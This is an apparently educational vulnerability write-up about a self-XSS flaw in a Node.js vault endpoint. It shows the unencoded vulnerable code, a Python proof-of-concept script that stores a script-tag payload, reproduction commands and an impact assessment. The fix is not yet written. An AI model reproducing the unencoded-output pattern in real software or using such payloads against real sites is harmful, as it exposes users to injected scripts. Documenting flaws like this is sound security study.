# Stored XSS in the vault — Cross-Site Scripting (Self-XSS, Low)

## Description

The `/vault` feature lets a logged-in user store a personal secret and view it
later. The stored value is sent back to the page **without any output
encoding**, so any HTML or JavaScript in the secret is interpreted by the
browser instead of being shown as text. Storing a `<script>` payload therefore
results in script execution when the page is viewed.

## Vulnerable code (`v1-vulnerable`)

```javascript
// server.js — GET /vault
if (utente.secret === "") {
  res.send("L'utente non ha ancora inserito alcun segreto");
} else {
  res.send(`segreto : ${utente.secret}`);   // user input reflected, no encoding
}
```

The secret comes straight from user input (`POST /vault`) and is concatenated
into the response, which `res.send` serves as `text/html`.

## Exploit

Script: `attacks/xss_vault.py`

```python
import requests

s = requests.Session()
url = "http://localhost:3000"
user, pw = "pierreicsXSS", "MyWeakPassword123!"

s.post(url + "/register", data={"username": user, "password": pw})
s.post(url + "/login",    data={"username": user, "password": pw})
s.post(url + "/vault",    data={"secret": "<script>alert(1)</script>"})

print(s.get(url + "/vault").text)   # the payload is reflected un-encoded
```

To reproduce:

```bash
git checkout v1-vulnerable && node server.js
python attacks/xss_vault.py
```

The response contains the raw `<script>alert(1)</script>` tag. Opening
`http://localhost:3000/vault` in a browser while logged in as that user
executes the script and pops the alert (see `docs/img/xss-alert.png`).

Note: `requests` does not run JavaScript, so the script's role is to prove the
payload is **reflected without encoding**; the execution is confirmed in a
browser.

## Impact

As it stands this is **self-XSS**: a user can only inject into their own secret,
which only they can view. There is no way to deliver the payload to another
victim, so real-world impact is low — many programs classify self-XSS as
informational.

It would become a genuine **stored XSS** with real impact if the secret were
ever displayed to a *different* user — for example an admin panel listing users'
secrets. Then an attacker could store a payload that runs in the admin's
browser. The underlying flaw (missing output encoding) is the same; only the
exposure changes.

## Fix

🔜 **Coming** — not yet implemented.

Direction: user input must not be concatenated into raw HTML; the secret has to
be output-encoded (or rendered through an auto-escaping template) so it is shown
as text, never executed. The implementation and the before/after verification
will be documented here once done.
